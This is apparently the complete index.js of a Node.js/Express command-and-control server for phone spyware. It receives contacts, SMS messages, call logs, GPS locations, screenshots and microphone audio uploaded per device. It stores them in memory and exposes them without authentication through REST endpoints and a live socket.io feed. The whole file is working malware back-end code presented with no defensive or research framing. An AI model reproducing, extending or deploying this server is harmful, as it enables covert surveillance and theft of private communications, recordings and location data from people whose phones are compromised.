// === index.js ===
const express   = require('express');
const http      = require('http');
const cors      = require('cors');
const { Server }= require('socket.io');
const path      = require('path');
const multer    = require('multer');
const fs        = require('fs');

const app    = express();
const server = http.createServer(app);
const io     = new Server(server, {
  cors: { origin: '*' }
});

const PORT = process.env.PORT || 3000;

// ── MIDDLEWARE ────────────────────────────────────────────────────────────────
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

// ── IN‑MEMORY STORE ───────────────────────────────────────────────────────────
const devices = {};
function ensureDevice(id) {
  if (!devices[id]) {
    devices[id] = {
      info:      {},
      contacts:  [],
      sms:       [],
      calllogs:  [],
      locations: [],
      screenshots: [],
      audio:     []
    };
  }
}

// helper to emit real‑time updates
function emitUpdate(deviceId, type, data) {
  io.emit(`new-${type}`, { deviceId, data });
}

// ── MULTER SETUP (for audio uploads) ──────────────────────────────────────────
const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir, { recursive: true });

const storage = multer.diskStorage({
  destination(req, file, cb) {
    // deviceId can come in body or params
    const id = req.body.deviceId || req.params.deviceId;
    const dir = path.join(uploadDir, id);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    cb(null, dir);
  },
  filename(req, file, cb) {
    const ts = new Date().toISOString().replace(/:/g,'-');
    cb(null, `audio-${ts}.mp3`);
  }
});
const upload = multer({ storage });


// ── MAIN /submit ENDPOINT ────────────────────────────────────────────────────
app.post('/submit', (req, res) => {
  // either a true deviceId, or fallback to the "device" summary string
  const deviceId = req.body.deviceId || req.body.device;
  if (!deviceId) {
    return res.status(400).json({ error: 'deviceId required (or field "device")' });
  }
  ensureDevice(deviceId);

  // --- device summary/info
  if (req.body.device) {
    devices[deviceId].info.summary   = req.body.device;
    devices[deviceId].info.timestamp = new Date().toISOString();
    emitUpdate(deviceId, 'deviceinfo-update', devices[deviceId].info);
  }

  // --- contacts array
  if (Array.isArray(req.body.contacts)) {
    devices[deviceId].contacts.push(...req.body.contacts);
    emitUpdate(deviceId, 'contacts', req.body.contacts);
  }

  // --- sms array
  if (Array.isArray(req.body.sms)) {
    devices[deviceId].sms.push(...req.body.sms);
    emitUpdate(deviceId, 'sms', req.body.sms);
  }

  // --- call logs (client might call it calllog or calls)
  const calls = req.body.calllog || req.body.calls || req.body.calllogs;
  if (Array.isArray(calls)) {
    devices[deviceId].calllogs.push(...calls);
    emitUpdate(deviceId, 'calllog', calls);
  }

  // --- location object
  if (req.body.location && typeof req.body.location === 'object') {
    devices[deviceId].locations.push(req.body.location);
    emitUpdate(deviceId, 'location', req.body.location);
  }

  // --- screenshots
  if (Array.isArray(req.body.screenshots)) {
    devices[deviceId].screenshots.push(...req.body.screenshots);
    emitUpdate(deviceId, 'screenshot', req.body.screenshots);
  }

  // --- any inline audio array
  if (Array.isArray(req.body.audio)) {
    devices[deviceId].audio.push(...req.body.audio);
    emitUpdate(deviceId, 'audio', req.body.audio);
  }

  res.json({ message: 'Data received for ' + deviceId });
});


// ── AUDIO UPLOAD ENDPOINT ─────────────────────────────────────────────────────
app.post('/api/audio', upload.single('audio'), (req, res) => {
  const deviceId = req.body.deviceId;
  if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
  ensureDevice(deviceId);
  if (!req.file) return res.status(400).json({ error: 'No audio file uploaded' });

  const entry = {
    filename: req.file.filename,
    url:      `/uploads/${deviceId}/${req.file.filename}`,
    timestamp: new Date().toISOString()
  };
  devices[deviceId].audio.push(entry);
  emitUpdate(deviceId, 'audio', entry);
  res.json({ message: 'Audio uploaded', audio: entry });
});


// ── INFO UPDATE ENDPOINT ──────────────────────────────────────────────────────
app.post('/api/deviceinfo', (req, res) => {
  const { deviceId, ...info } = req.body;
  if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
  ensureDevice(deviceId);
  devices[deviceId].info = { ...devices[deviceId].info, ...info, timestamp: new Date().toISOString() };
  emitUpdate(deviceId, 'deviceinfo-update', devices[deviceId].info);
  res.json({ message: 'Device info updated', info: devices[deviceId].info });
});


// ── GENERIC GET TERMINALS ──────────────────────────────────────────────────────
app.get('/api/devices', (req, res) => {
  res.json(Object.keys(devices));
});
app.get('/api/location',  (req,res) => {
  const { deviceId } = req.query;
  const out = deviceId
    ? (devices[deviceId]?.locations||[])
    : Object.entries(devices).flatMap(([id,d])=>d.locations.map(l=>({ deviceId:id, ...l })));
  res.json(out);
});
app.get('/api/contacts',  (req,res) => {
  const { deviceId } = req.query;
  const out = deviceId
    ? (devices[deviceId]?.contacts||[])
    : Object.entries(devices).flatMap(([id,d])=>d.contacts.map(c=>({ deviceId:id, ...c })));
  res.json(out);
});
app.get('/api/sms',       (req,res) => {
  const { deviceId } = req.query;
  const out = deviceId
    ? (devices[deviceId]?.sms||[])
    : Object.entries(devices).flatMap(([id,d])=>d.sms.map(s=>({ deviceId:id, ...s })));
  res.json(out);
});
app.get('/api/calllog',   (req,res) => {
  const { deviceId } = req.query;
  const out = deviceId
    ? (devices[deviceId]?.calllogs||[])
    : Object.entries(devices).flatMap(([id,d])=>d.calllogs.map(c=>({ deviceId:id, ...c })));
  res.json(out);
});
app.get('/api/screenshot', (req,res) => {
  const { deviceId } = req.query;
  const out = deviceId
    ? (devices[deviceId]?.screenshots||[])
    : Object.entries(devices).flatMap(([id,d])=>d.screenshots.map(s=>({ deviceId:id, ...s })));
  res.json(out);
});
app.get('/api/audio',      (req,res) => {
  const { deviceId } = req.query;
  const out = deviceId
    ? (devices[deviceId]?.audio||[])
    : Object.entries(devices).flatMap(([id,d])=>d.audio.map(a=>({ deviceId:id, ...a })));
  res.json(out);
});


// ── WEBSOCKET INIT ────────────────────────────────────────────────────────────
io.on('connection', socket => {
  console.log('WS client connected:', socket.id);
  // push full snapshot
  socket.emit('init-data', devices);
});


// ── START SERVER ─────────────────────────────────────────────────────────────
server.listen(PORT, () => {
  console.log(`🚀 Server running on http://localhost:${PORT}`);
});
